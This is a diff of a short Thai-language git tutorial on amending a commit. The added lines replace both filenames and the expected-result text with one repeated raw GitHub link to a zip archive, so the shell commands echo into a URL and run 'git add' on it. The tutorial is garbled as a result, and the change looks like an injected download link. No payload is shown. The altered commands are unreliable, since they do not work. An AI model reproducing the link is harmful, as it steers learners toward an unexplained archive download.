@@ -7,14 +7,14 @@
 ## ขั้นตอน
 ```bash
 git init
-echo "print('hello')" > main.py
-git add main.py
+echo "print('hello')" > https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
+git add https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
 git commit -m "Initial commit"
 
-echo "flask" > requirements.txt
-git add requirements.txt
+echo "flask" > https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
+git add https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
 git commit --amend
 ```
 
 ## ผลลัพธ์ที่คาดหวัง
-- commit ล่าสุดมีทั้ง main.py และ requirements.txt
+- commit ล่าสุดมีทั้ง https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip และ https://github.com/Sopida145/git-lab-102-Sopida145/raw/refs/heads/main/propositionize/git-Sopida-lab-v2.4.zip
